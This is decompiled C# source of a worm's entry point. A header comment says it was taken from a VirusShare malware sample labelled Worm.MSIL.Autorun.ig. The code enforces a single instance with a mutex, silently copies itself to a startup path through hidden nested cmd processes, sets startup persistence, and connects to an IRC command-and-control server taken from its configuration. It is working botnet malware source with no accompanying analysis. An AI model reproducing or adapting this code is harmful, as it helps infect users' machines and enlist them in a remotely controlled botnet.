// Decompiled with JetBrains decompiler
// Type: explorer.bot
// Assembly: explorer, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 56E5CD67-A795-400A-AA93-F7890471D495
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00008-msil\Worm.MSIL.Autorun.ig-2c86700b4d3a736629e63a7f91f6e488e611145530107c5a2b53ad8867079764.exe

using System;
using System.Diagnostics;
using System.Windows.Forms;

namespace explorer
{
  internal static class bot
  {
    [STAThread]
    private static void Main()
    {
      if (new InstanceUnique("{" + config.mutex + "}").IsRunning())
        Process.GetCurrentProcess().Kill();
      if (!config.truedebug && Application.ExecutablePath != config.infecting_startup_pathexe)
      {
        Process process = new Process();
        process.EnableRaisingEvents = false;
        process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
        process.StartInfo.FileName = "cmd";
        process.StartInfo.Arguments = "/c cmd /c cmd /c cmd /c copy \"" + Application.ExecutablePath + "\" \"" + config.infecting_startup_pathexe + "\"";
        process.Start();
        process.WaitForExit();
        new Process()
        {
          EnableRaisingEvents = false,
          StartInfo = {
            WindowStyle = ProcessWindowStyle.Hidden,
            FileName = "cmd",
            Arguments = ("/c cmd /c \"" + config.infecting_startup_pathexe + "\"")
          }
        }.Start();
      }
      if (!(Application.ExecutablePath == config.infecting_startup_pathexe) && !config.truedebug)
        return;
      if (!misc.startupIsInfected(config.infecting_startup_name))
        misc.setInfected(config.infecting_startup_name, config.infecting_startup_pathexe, true);
      new irc(config.host, config.port, true).setHandler((handler) new messhandler());
    }
  }
}
